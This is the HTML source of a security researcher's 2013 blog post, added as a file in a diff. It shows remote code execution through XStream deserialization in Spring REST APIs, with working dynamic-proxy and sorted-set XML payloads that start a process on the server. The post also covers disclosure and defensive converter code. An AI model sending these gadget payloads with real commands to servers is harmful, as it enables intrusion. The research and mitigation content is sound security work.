@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>RCE via XStream object deserialization</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="When researching SpringMVC RESTful APIs and their XXE vulnerabilities I found that XStream was not vulnerable to XXE because it ignored the &amp;lt;DOCTYPE /&amp;gt; blocks. Curious about it I decided to took a deeper look at XStream and found out that its not just a simple marshalling library as JAXB but a much more powerful serializing library capable of serializing to an XML representation really complex types and not just POJOs.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="RCE via XStream object deserialization">
+    <meta name="twitter:description" content="When researching SpringMVC RESTful APIs and their XXE vulnerabilities I found that XStream was not vulnerable to XXE because it ignored the &amp;lt;DOCTYPE /&amp;gt; blocks. Curious about it I decided to took a deeper look at XStream and found out that its not just a simple marshalling library as JAXB but a much more powerful serializing library capable of serializing to an XML representation really complex types and not just POJOs.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="RCE via XStream object deserialization">
+  <meta property="og:description" content="When researching SpringMVC RESTful APIs and their XXE vulnerabilities I found that XStream was not vulnerable to XXE because it ignored the &amp;lt;DOCTYPE /&amp;gt; blocks. Curious about it I decided to took a deeper look at XStream and found out that its not just a simple marshalling library as JAXB but a much more powerful serializing library capable of serializing to an XML representation really complex types and not just POJOs.">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">RCE via XStream object deserialization</h1>
+      <p class="post-meta">@pwntester · Dec 23, 2013 · 8 min read</p>
+    </header>
+    <article class="post-content">
+
+<p>When researching <a href="http://www.pwntester.com/blog/2013/08/23/springmvc-vulnerable-to-xxe/">SpringMVC RESTful APIs and their XXE vulnerabilities</a> I found that <a href="http://xstream.codehaus.org/index.html">XStream</a> was not vulnerable to XXE because it ignored the <strong>&lt;DOCTYPE /&gt;</strong> blocks. Curious about it I decided to took a deeper look at XStream and found out that its not just a simple marshalling library as JAXB but a much more powerful serializing library capable of serializing to an XML representation really complex types and not just POJOs. I took a look at the list of <a href="http://xstream.codehaus.org/converters.html">XStream converters</a> and found the following interesting one:</p>
+
+<p><img src="/images/octopress/reflectionconverter.png" alt="" /></p>
+
+<p>As stated by the XStream documentation:</p>
+
+<blockquote>
+<p>The dynamic proxy itself is not serialized, however the interfaces it implements and the actual InvocationHandler instance are serialized. This allows the proxy to be reconstructed after deserialization.</p>
+</blockquote>
+
+<p>This allow us to send an XML representation of a dynimic proxy where the InvocationHandler will be XStream serialized. The XML representation will look something like:</p>
+
+<pre><code class="language-lang-markup"> &lt;dynamic-proxy&gt;
+  &lt;interface&gt;com.foo.Blah&lt;/interface&gt;
+  &lt;interface&gt;com.foo.Woo&lt;/interface&gt;
+  &lt;handler class=&quot;com.foo.MyHandler&quot;&gt;
+    &lt;something&gt;blah&lt;/something&gt;
+  &lt;/handler&gt;
+&lt;/dynamic-proxy&gt;
+</code></pre>
+
+<p>So for those not familiar with a dynamic proxy, lets say that is a way to intercept any call to an interface declared method so that when the method is invoked on the proxified interface we can hook the method call and inject any custom code.</p>
+
+<p><img src="/images/octopress/proxy.png" alt="" /></p>
+
+<p>The <strong>InvocationHandler</strong> will be the responsable to handle the intercepted call. For our exploit we will be using <a href="http://docs.oracle.com/javase/7/docs/api/java/beans/EventHandler.html">java.beans.EventHandler</a> that does not implement the <strong>Serializable</strong> interface so we could not use it for our <a href="http://www.pwntester.com/blog/2013/12/16/rce-through-deserialization-of-spring-defaultlistablebeanfactories-cve-2011-2894/">CVE-2011-2894 exploit</a> but that is serializable using XStream.</p>
+
+<p>The simplest scenario is the one where the server is expecting a serialized instance that implements a given interface. Lets say that the server code looks like:</p>
+
+<pre><code class="language-lang-java">@Controller
+ @RequestMapping(&quot;/contacts&quot;)
+ public class ContactController {
+     @Autowired
+     private ContactRepository contactRepository;
+
+     @RequestMapping( method = RequestMethod.POST )
+     @ResponseStatus( HttpStatus.CREATED )
+      public final String create( @RequestBody Contact contact ){
+         log(”Creating new contact: &quot; + contact.getFirstName());
+         contactRepository.save(contact);
+         return &quot;OK&quot;;
+     }
+ }
+</code></pre>
+
+<p>So the idea is to:</p>
+
+<ul>
+<li>Find out what Class the XML will be deserialized to (in this case com.company.model.Contact)</li>
+<li>Create a proxy for that class</li>
+<li>Intercept/hook any call to any method in the interface</li>
+<li>Replace the original call with the malicious payload</li>
+<li>Send the serialized version of the proxy</li>
+<li>Cross-fingers</li>
+<li>Profit</li>
+</ul>
+
+<p>So this is what our server application was expecting:</p>
+
+<pre><code class="language-lang-markup">&lt;contact&gt;
+    &lt;id&gt;1&lt;/id&gt;
+    &lt;firstName&gt;alvaro&lt;/firstName&gt;
+    &lt;lastName&gt;munoz&lt;/lastName&gt;
+    &lt;email&gt;alvaro@pwntester.com&lt;/email&gt;
+&lt;/contact&gt;
+</code></pre>
+
+<p>And this is what we will send in order to execute any arbitrary payload:</p>
+
+<pre><code class="language-lang-markup">&lt;dynamic-proxy&gt;
+&lt;interface&gt;com.company.model.Contact&lt;/interface&gt;
+&lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+    &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
+	&lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;
+    &lt;/target&gt;
+    &lt;action&gt;start&lt;/action&gt;
+&lt;/handler&gt;
+&lt;/dynamic-proxy&gt;
+</code></pre>
+
+<p>As you can see we are defining a <strong>dynamic proxy</strong> for the &ldquo;com.company.model.Contact&rdquo; interface and intercepting any method call on that interface with a &ldquo;java.beans.EventHandler&rdquo; invocation handler. This handler will replace the original method call with a call to &ldquo;java.lang.ProcessBuilder.start(&rdquo;/Applications/Calculator.app/Contents/MacOS/Calculator&rdquo;)&ldquo;.</p>
+
+<p>Convenient, isn&rsquo;t it?</p>
+
+<p>So as soon as the server code reaches a method call on the proxified interface like the following line on our example controller:</p>
+
+<pre><code class="language-lang-java">log(”Creating new contact: &quot; + contact.getFirstName());
+</code></pre>
+
+<p>The method call will be intercepted and replaced with our payload and the result will be a malicious calculator running on the server :)</p>
+
+<p><img src="/images/octopress/calc.png" alt="" /></p>
+
+<h2 id="increasing-the-success-likelihood">Increasing the success likelihood</h2>
+
+<p>Finding out what Class the server is expecting can be difficult and we also have the limitation that the class needs to implements an interface. How many applications have you seen using interfaces for POJO DTOs?? A solution for this problem is to serialize an object that contains other objects and that in order to instantiate this object, a call to an interface method has to be made. This is where we will be able to inject our malicious code using an <strong>InvocationHandler</strong>. The original idea by <strong>Jörg Schaible</strong> (XStream developer) was proposed during the disclosure to the XStream team and can be found <a href="https://www.mail-archive.com/user@xstream.codehaus.org/msg00605.html">here</a>. This variant consists on serializing a <a href="http://docs.oracle.com/javase/6/docs/api/java/util/TreeSet.html">java.util.TreeSet</a> containg different objects implementing the <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html">java.lang.Comparable</a> interface so that when the <strong>Set</strong> is instantiated on the server side, the <strong>Comparable</strong> interface methods are called to sort the <strong>Set</strong>. All we have to do now is to add a dynamic proxy intercepting any method call to the <strong>Comparable</strong> interface and replacing it with our payload:</p>
+
+<pre><code class="language-lang-java">Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();
+set.add(&quot;foo&quot;);
+set.add(EventHandler.create(Comparable.class, new ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;));
+</code></pre>
+
+<p>If we try to serialize it using XStream <strong>toXML</strong> it will throw a Cast exception and we wont be able to get the serialized version:</p>
+
+<pre><code class="language-lang-java">Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();
+set.add(&quot;foo&quot;);
+set.add(EventHandler.create(Comparable.class, new ProcessBuilder(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;), &quot;start&quot;));
+String payload = xstream.toXML(set);
+System.out.println(payload);
+</code></pre>
+
+<p>Will throw:</p>
+
+<pre><code class="language-lang-bash">Exception in thread &quot;main&quot; java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.lang.Integer
+  at com.sun.proxy.$Proxy4.compareTo(Unknown Source)
+  at java.util.TreeMap.put(TreeMap.java:560)
+  at java.util.TreeSet.add(TreeSet.java:255)
+  at com.pwntester.xstreampoc.Main.main(Main.java:26)
+  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
+  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+  at java.lang.reflect.Method.invoke(Method.java:601)
+  at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
+</code></pre>
+
+<p>That will also happen during the deserialization process but at least we will be able to execute our payload.
+Anyway, we will need to craft the payload by hand and we will get something like:</p>
+
+<pre><code class="language-lang-markup">&lt;sorted-set&gt;
+  &lt;string&gt;foo&lt;/string&gt;
+  &lt;dynamic-proxy&gt;
+    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+    &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+      &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
+        &lt;command&gt;
+          &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;
+        &lt;/command&gt;
+      &lt;/target&gt;
+      &lt;action&gt;start&lt;/action&gt;
+    &lt;/handler&gt;
+  &lt;/dynamic-proxy&gt;
+&lt;/sorted-set&gt;
+</code></pre>
+
+<p>Now, if we deserialize this XML, we will get a Cast exception and our malicious calculator running on the server:</p>
+
+<pre><code class="language-lang-java">String payload = &quot;&lt;sorted-set&gt;&quot; +
+        &quot;&lt;string&gt;foo&lt;/string&gt;&quot; +
+        &quot;&lt;dynamic-proxy&gt;&quot; +
+        &quot;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&quot; +
+        &quot;&lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;&quot; +
+        &quot; &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot; +
+        &quot; &lt;command&gt;&quot; +
+        &quot; &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&quot; +
+        &quot; &lt;/command&gt;&quot; +
+        &quot; &lt;/target&gt;&quot; +
+        &quot; &lt;action&gt;start&lt;/action&gt;&quot; +
+        &quot;&lt;/handler&gt;&quot; +
+        &quot;&lt;/dynamic-proxy&gt;&quot; +
+        &quot;&lt;/sorted-set&gt;&quot;;
+
+Contact c = (Contact) xstream.fromXML(payload);
+</code></pre>
+
+<p><img src="/images/octopress/calc.png" alt="" /></p>
+
+<p>You can find the whole project POC in the <a href="https://github.com/pwntester/XStreamPOC">XStream POC github repo</a></p>
+
+<h2 id="disclosure">Disclosure</h2>
+
+<p>I reported this issue to the XStream developers. I was wondering if there was any way to unregister the <strong>reflection</strong> converter by default. As you can see in this <a href="https://www.mail-archive.com/user@xstream.codehaus.org/msg00602.html">mail thread</a>, there was a solution. Unregistering the converter was not possible but registering a catch-all converter with higher priority than the reflection one should be possible.</p>
+
+<p>As the XStream team argued, disabling it dy default was not an option since it was used by 99% of all projects using XStream:</p>
+
+<blockquote>
+<blockquote>
+<blockquote>
+<p>Would it be possible to not register the reflection converters by default so only users that need them do it?
+Unfortunately no. It&rsquo;s one of XStream&rsquo;s key features that you actually can
+marshal nearly any object graph out of the box. If we drop the
+ReflectionConverter as catch all, we&rsquo;ll break immediately ~99% of all
+existing projects using XStream.</p>
+</blockquote>
+</blockquote>
+</blockquote>
+
+<p>I was ok with that since at least there was a way to &ldquo;disable&rdquo; it manually. But I saw no point on having the reflection converter on by default in SpringOXM when used for building RESTful webservices. RESTful APIs are about representation of entities and I see no point on serializing dynamic proxies to represent those entities. I got in contact with Spring Security Team and let them know the issue. Their response was that <strong>XStream</strong> should not be use for RESTFul webservices and that they wont disable the converter by default in their SpringOXM wrapper since its not only used by SpringMVC but they agreed in updating the <a href="https://github.com/spring-projects/spring-framework/pull/322/files">SpringMVC documentation</a> to reflect that <strong>XStreamMarshaller</strong> should be used at your own risk when used to build RESTful APIs.</p>
+
+<p><img src="/images/octopress/springdocs.png" alt="" /></p>
+
+<h2 id="what-to-do-about-it">What to do about it</h2>
+
+<p>Ok, so what can we do as developers to avoid this? We need to:</p>
+
+<ul>
+<li>Register a standard priority converter for the beans you are expecting in your application</li>
+<li>Register a catch-all converter with higher priority than the reflection ones (low priority) and make the converter to return <strong>null</strong> on its <strong>unmarshall</strong> method so any object deserialized by the catch-all converter, will throw an exception and interrupt the converter chain before hitting the Reflection converters.</li>
+</ul>
+
+<p>Writing a custom converter is easy and its explaind in detail on the <a href="http://xstream.codehaus.org/converter-tutorial.html">XStream documentation</a>. We will be creating a custom converter for the <strong>Contact</strong> class in the <a href="https://github.com/pwntester/XStreamPOC">XStream POC</a> example presented above:</p>
+
+<pre><code class="language-lang-java">package com.pwntester.xstreampoc;
+
+import com.thoughtworks.xstream.converters.Converter;
+import com.thoughtworks.xstream.converters.MarshallingContext;
+import com.thoughtworks.xstream.converters.UnmarshallingContext;
+import com.thoughtworks.xstream.io.HierarchicalStreamReader;
+import com.thoughtworks.xstream.io.HierarchicalStreamWriter;
+
+public class ContactConverter implements Converter {
+
+    public boolean canConvert(Class clazz) {
+        return clazz.equals(Contact.class);
+    }
+
+    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
+        Contact contact = (Contact) value;
+        writer.startNode(&quot;name&quot;);
+        writer.setValue(contact.getName());
+        writer.endNode();
+    }
+
+    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
+        Contact contact = new Contact();
+        reader.moveDown();
+        contact.setName(reader.getValue());
+        reader.moveUp();
+        return contact;
+    }
+
+}
+</code></pre>
+
+<p>For the catch-all converter, we will return <strong>null</strong> when unmarshalling:</p>
+
+<pre><code class="language-lang-java">package com.pwntester.xstreampoc;
+
+import com.thoughtworks.xstream.converters.Converter;
+import com.thoughtworks.xstream.converters.MarshallingContext;
+import com.thoughtworks.xstream.converters.UnmarshallingContext;
+import com.thoughtworks.xstream.io.HierarchicalStreamReader;
+import com.thoughtworks.xstream.io.HierarchicalStreamWriter;
+
+public class CatchAllConverter implements Converter {
+
+    public boolean canConvert(Class clazz) {
+        return true;
+    }
+
+    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
+    }
+
+    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
+       return null;
+    }
+
+}
+</code></pre>
+
+<p>Ok, now before deserializing our untrusted input we have to register our new converters:</p>
+
+<pre><code class="language-lang-java">XStream xstream = new XStream(new DomDriver());
+xstream.processAnnotations(Contact.class);
+xstream.registerConverter(new ContactConverter());
+xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);
+</code></pre>
+
+<p>We need to wrap our deserializing call within a try-catch block:</p>
+
+<pre><code class="language-lang-java">try {
+        Contact expl = (Contact) xstream.fromXML(payload);
+} catch (com.thoughtworks.xstream.converters.ConversionException ex) {
+    System.out.println(&quot;Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter&quot;);
+}
+</code></pre>
+
+<p>And that&rsquo;s pretty much it, lets run the application again with our malicious payload:</p>
+
+<pre><code class="language-lang-markup">&lt;contact&gt;
+  &lt;name&gt;Alvaro&lt;/name&gt;
+&lt;/contact&gt;
+Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter
+</code></pre>
+
+<p>Voila!! no calculator this time!</p>
+
+<h2 id="further-reading">Further reading</h2>
+
+<ul>
+<li>This vulnerability was presented by <a href="http://www.linkedin.com/pub/abraham-kang/0/953/384">Abraham Kang</a>, <a href="https://twitter.com/DinisCruz‎">Dinis Cruz</a> and yours truly during the  <a href="http://www.slideshare.net/DinisCruz/res-ting-on-your-laurels-will-get-you-powned4-3">&ldquo;RESTing On Your Laurels will Get YOu Pwned&rdquo;</a> DefCon 2013 talk</li>
+<li>Dinis Cruz wrote a great <a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html">follow-up post</a> on his blog</li>
+</ul>
+
+<p>Thanks for reading!</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/java"><span class="tag">Java</span></a></li>
+        
+          <li><a href="/tags/exploit"><span class="tag">Exploit</span></a></li>
+        
+          <li><a href="/tags/rce"><span class="tag">RCE</span></a></li>
+        
+          <li><a href="/tags/xstream"><span class="tag">XStream</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2131</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
